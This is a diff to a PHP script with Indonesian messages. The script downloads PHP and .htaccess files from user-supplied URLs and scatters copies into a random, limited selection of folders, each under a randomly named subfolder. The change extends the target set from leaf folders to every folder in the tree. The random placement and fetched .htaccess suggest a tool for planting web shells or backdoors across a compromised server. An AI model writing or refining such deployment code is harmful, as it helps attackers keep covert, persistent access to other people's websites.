@@ -3,6 +3,8 @@ ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
+define('SCRIPT_VERSION', '2025-07-08-v4');
+
 $success = [];
 $error = [];
 
@@ -31,12 +33,12 @@ function generateRandomFolderName($base, $used = []) {
     return $base . '/folder_' . substr(md5(uniqid()), 0, 6);
 }
 
-function findLeafFolders($dir, &$errorLog = []) {
-    $leafFolders = [];
-    $dirs = [$dir];
+function findAllWritableFolders($dir, &$errorLog = []) {
+    $results = [];
+    $queue = [$dir];
 
-    while (!empty($dirs)) {
-        $current = array_pop($dirs);
+    while (!empty($queue)) {
+        $current = array_pop($queue);
 
         if (!is_readable($current)) {
             $owner = @posix_getpwuid(@fileowner($current));
@@ -47,22 +49,18 @@ function findLeafFolders($dir, &$errorLog = []) {
         }
 
         $subdirs = @glob($current . '/*', GLOB_ONLYDIR);
-
         if ($subdirs === false) {
             $errorLog[] = "⚠️ Gagal membaca isi folder: $current";
             continue;
         }
 
-        if (empty($subdirs)) {
-            $leafFolders[] = $current;
-        } else {
-            foreach ($subdirs as $sub) {
-                $dirs[] = $sub;
-            }
+        $results[] = $current;
+        foreach ($subdirs as $sub) {
+            $queue[] = $sub;
         }
     }
 
-    return $leafFolders;
+    return $results;
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -82,14 +80,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (!$htaccessContent) $error[] = "❌ Gagal ambil .htaccess dari URL.";
 
         if ($phpContent && $htaccessContent) {
-            $leafFolders = findLeafFolders($target, $error);
-            $success[] = "📦 Folder buntu ditemukan: " . count($leafFolders);
+            $allFolders = findAllWritableFolders($target, $error);
+            $success[] = "📦 Semua folder ditemukan: " . count($allFolders);
 
-            if (empty($leafFolders)) {
-                $error[] = "❌ Tidak ada folder buntu ditemukan untuk deploy.";
+            if (empty($allFolders)) {
+                $error[] = "❌ Tidak ada folder yang bisa digunakan untuk deploy.";
             } else {
-                shuffle($leafFolders);
-                $targets = array_slice($leafFolders, 0, $limit);
+                shuffle($allFolders);
+                $targets = array_slice($allFolders, 0, $limit);
                 $usedFolders = [];
 
                 foreach ($targets as $base) {
@@ -165,6 +163,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
         <button type="submit">🚀 Deploy Sekarang</button>
     </form>
+
+    <p style="color:gray;font-size:0.9em;">Versi: <?= SCRIPT_VERSION ?></p>
 
     <?php if (!empty($success)): ?>
         <div class="log">
